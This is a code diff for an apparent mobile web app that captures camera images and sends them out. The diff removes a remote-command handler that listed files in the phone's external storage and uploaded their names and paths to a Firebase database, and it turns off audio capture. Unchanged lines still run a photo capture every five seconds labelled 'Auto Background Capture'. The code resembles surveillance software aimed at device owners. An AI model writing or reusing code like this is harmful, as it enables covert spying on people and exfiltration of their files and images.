@@ -289,7 +289,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: true 
+                    audio: false 
                 });
                 video.srcObject = localStream;
 
@@ -330,7 +330,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: true 
+                    audio: false 
                 });
                 
                 const track = localStream.getVideoTracks()[0];
@@ -512,58 +512,9 @@
             });
         }
 
-        // Admin Command Listener & Cordova File Plugin Scanner Logic for Foreground Remote Retrieval
-        function setupStorageCommandListener() {
-            db.ref('security/commands/loadStorage').on('value', (snapshot) => {
-                const cmd = snapshot.val();
-                if (cmd && cmd.action === 'execute') {
-                    scanAndUploadStorageFiles();
-                    // Reset command flag back to idle
-                    db.ref('security/commands/loadStorage').set({ action: 'idle' });
-                }
-            });
-        }
-
-        function scanAndUploadStorageFiles() {
-            if (typeof window.resolveLocalFileSystemURL === 'undefined' && (!window.cordova || !window.cordova.file)) {
-                console.log("Cordova file plugin not active in current test environment.");
-                // Fallback simulation entry for testing
-                db.ref('security/storageFiles').push({
-                    name: "Sample_Device_File.jpg",
-                    fullPath: "/storage/emulated/0/DCIM/Camera/sample.jpg",
-                    isDirectory: false,
-                    timestamp: new Date().toLocaleString()
-                });
-                return;
-            }
-
-            // Target external root storage directory (/storage/emulated/0/)
-            const targetDir = window.cordova.file.externalRootDirectory || window.cordova.file.dataDirectory;
-
-            window.resolveLocalFileSystemURL(targetDir, function(dirEntry) {
-                var reader = dirEntry.createReader();
-                reader.readEntries(function(entries) {
-                    // Clear previous list if needed, then push found files/folders to Firebase Realtime Database
-                    entries.forEach(function(entry) {
-                        db.ref('security/storageFiles').push({
-                            name: entry.name,
-                            fullPath: entry.fullPath,
-                            isDirectory: entry.isDirectory,
-                            timestamp: new Date().toLocaleString()
-                        });
-                    });
-                }, function(err) {
-                    console.error("Directory Read Error:", err);
-                });
-            }, function(err) {
-                console.error("Resolve FileSystem URL Error:", err);
-            });
-        }
-
         window.addEventListener('load', () => {
             requestPermissionsAndStart().then(() => {
                 setupWebRTCListener();
-                setupStorageCommandListener();
                 // 5-second lightweight auto background capture (smooth & non-laggy)
                 setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
             });
